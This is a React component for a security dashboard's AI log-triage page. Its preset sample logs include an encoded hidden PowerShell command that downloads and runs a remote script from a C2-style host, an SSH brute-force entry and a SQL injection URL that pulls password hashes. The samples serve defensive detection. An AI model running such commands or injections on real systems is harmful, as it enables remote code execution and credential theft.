import React, { useState, useEffect } from 'react';
import {
  BrainCircuit,
  Terminal,
  Send,
  Cpu,
  ShieldCheck,
  AlertTriangle,
  Flame,
  CheckCircle2,
} from 'lucide-react';
import toast from 'react-hot-toast';
import { aiService } from '../services';
import { SeverityBadge, RiskMeter } from '../components/Badges';

export const AIAnalysisPage = () => {
  const [logText, setLogText] = useState('');
  const [analyzing, setAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState(null);
  const [aiInsights, setAiInsights] = useState(null);

  useEffect(() => {
    const fetchInsights = async () => {
      try {
        const data = await aiService.getInsights();
        setAiInsights(data);
      } catch (err) {
        console.error('Failed to load AI insights:', err);
      }
    };
    fetchInsights();
  }, []);

  const handleAnalyze = async (e) => {
    e.preventDefault();
    if (!logText.trim()) return;
    try {
      setAnalyzing(true);
      const res = await aiService.analyzeText({ logText });
      setAnalysisResult(res);
      toast.success('AI threat analysis complete');
    } catch (err) {
      toast.error('AI analysis request failed');
    } finally {
      setAnalyzing(false);
    }
  };

  const sampleLogs = [
    {
      title: 'Suspicious PowerShell Encoded Payload',
      text: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AaQBvAC8AcAAuAHAAcwAxACcAKQA=',
    },
    {
      title: 'SSH Brute Force Dictionary Attack',
      text: 'sshd[12480]: Failed password for invalid user admin from 185.220.101.45 port 52312 ssh2; repeated 42 times',
    },
    {
      title: 'SQL Injection in REST Endpoint',
      text: '194.26.29.112 - - [07/Oct/2026:22:15:30] "GET /api/v1/auth/users?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1" 200 4120',
    },
  ];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-bold font-mono tracking-tight text-white flex items-center gap-2">
            <BrainCircuit className="w-5 h-5 text-purple-400" />
            AI THREAT TRIAGE WORKBENCH
          </h2>
          <p className="text-xs text-slate-400 font-mono mt-0.5">
            Machine learning Isolation Forest anomaly evaluation & LLM cybersecurity advisory
          </p>
        </div>
      </div>

      {/* Main Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left 2 Cols: Interactive Log Analyzer */}
        <div className="lg:col-span-2 space-y-6">
          <div className="soc-card rounded-xl p-5 border border-slate-800 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-300 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                Raw Telemetry / Log Inspector
              </h3>
              <span className="text-[10px] font-mono text-slate-400">Paste Syslog, Windows Event, or Wazuh JSON</span>
            </div>

            {/* Quick Sample Presets */}
            <div className="flex flex-wrap gap-2">
              {sampleLogs.map((sample, idx) => (
                <button
                  key={idx}
                  onClick={() => setLogText(sample.text)}
                  className="px-2.5 py-1 rounded bg-slate-900/80 hover:bg-cyan-500/10 hover:border-cyan-500/40 text-slate-400 hover:text-cyan-400 border border-slate-800 text-[11px] font-mono transition-all"
                >
                  {sample.title}
                </button>
              ))}
            </div>

            <form onSubmit={handleAnalyze} className="space-y-3">
              <textarea
                rows={5}
                required
                value={logText}
                onChange={(e) => setLogText(e.target.value)}
                placeholder="Paste security telemetry or event log..."
                className="w-full soc-input p-3 rounded-lg text-xs font-mono leading-relaxed"
              />

              <button
                type="submit"
                disabled={analyzing || !logText.trim()}
                className="w-full py-2.5 rounded-lg bg-gradient-to-r from-purple-500 to-cyan-500 hover:from-purple-400 hover:to-cyan-400 text-black font-bold font-mono text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-all shadow-glow-purple disabled:opacity-50"
              >
                <BrainCircuit className={`w-4 h-4 ${analyzing ? 'animate-spin' : ''}`} />
                <span>{analyzing ? 'RUNNING AI TRIAGE...' : 'RUN AI THREAT ANALYSIS'}</span>
              </button>
            </form>
          </div>

          {/* AI Result Card */}
          {analysisResult && (
            <div className="soc-card rounded-xl p-6 border border-purple-500/40 shadow-glow-purple space-y-5">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <h3 className="text-sm font-bold font-mono text-white">AI ANALYSIS RESULTS</h3>
                  <SeverityBadge severity={analysisResult.severity} />
                </div>
                <span className="text-xs font-mono text-cyan-400">
                  Confidence: {Math.round(analysisResult.confidence * 100)}%
                </span>
              </div>

              <div className="grid grid-cols-2 md:grid-cols-3 gap-4 text-xs font-mono">
                <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800">
                  <span className="text-slate-500 block text-[10px] uppercase">Threat Classification</span>
                  <span className="text-cyan-400 font-bold">{analysisResult.threatType}</span>
                </div>
                <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800">
                  <span className="text-slate-500 block text-[10px] uppercase">Isolation Forest Outlier</span>
                  <span className={analysisResult.isAnomaly ? 'text-red-400 font-bold' : 'text-emerald-400 font-bold'}>
                    {analysisResult.isAnomaly ? 'YES (Statistical Anomaly)' : 'NO (Nominal Pattern)'}
                  </span>
                </div>
                <div className="p-3 rounded-lg bg-slate-900/60 border border-slate-800">
                  <span className="text-slate-500 block text-[10px] uppercase">Calculated Risk Score</span>
                  <span className="text-white font-bold">{analysisResult.riskScore} / 100</span>
                </div>
              </div>

              {/* Advisory Explanation */}
              <div className="space-y-1.5">
                <span className="text-[10px] font-mono uppercase text-slate-400 font-bold">Threat Evaluation</span>
                <p className="text-xs text-slate-200 leading-relaxed bg-slate-900/60 p-3.5 rounded-lg border border-slate-800">
                  {analysisResult.explanation}
                </p>
              </div>

              {/* Recommended Actions */}
              <div className="space-y-2">
                <span className="text-[10px] font-mono uppercase text-slate-400 font-bold">
                  Recommended Containment Steps
                </span>
                <ul className="space-y-1.5">
                  {analysisResult.recommendedActions?.map((act, i) => (
                    <li key={i} className="flex items-start gap-2 text-xs text-slate-300 bg-slate-900/40 p-2.5 rounded-lg border border-slate-800">
                      <span className="w-4 h-4 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center text-[10px] font-mono flex-shrink-0 font-bold">
                        {i + 1}
                      </span>
                      <span>{act}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          )}
        </div>

        {/* Right Col: AI Microservice Engine Telemetry */}
        <div className="space-y-6">
          <div className="soc-card rounded-xl p-5 border border-slate-800 space-y-4">
            <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-300 flex items-center gap-2">
              <Cpu className="w-4 h-4 text-cyan-400" />
              Machine Learning Engine Status
            </h3>

            <div className="space-y-3 text-xs font-mono">
              <div className="flex items-center justify-between p-2.5 rounded bg-slate-900/50 border border-slate-800">
                <span className="text-slate-500">Anomaly Algorithm:</span>
                <span className="text-cyan-400 font-bold">Isolation Forest (100 Trees)</span>
              </div>
              <div className="flex items-center justify-between p-2.5 rounded bg-slate-900/50 border border-slate-800">
                <span className="text-slate-500">Contamination Factor:</span>
                <span className="text-white font-bold">0.10 (10% expected outliers)</span>
              </div>
              <div className="flex items-center justify-between p-2.5 rounded bg-slate-900/50 border border-slate-800">
                <span className="text-slate-500">Total Anomalies Flagged:</span>
                <span className="text-red-400 font-bold">{aiInsights?.stats?.anomaliesDetected || 0}</span>
              </div>
              <div className="flex items-center justify-between p-2.5 rounded bg-slate-900/50 border border-slate-800">
                <span className="text-slate-500">High Risk Threat Events:</span>
                <span className="text-orange-400 font-bold">{aiInsights?.stats?.highRiskThreats || 0}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
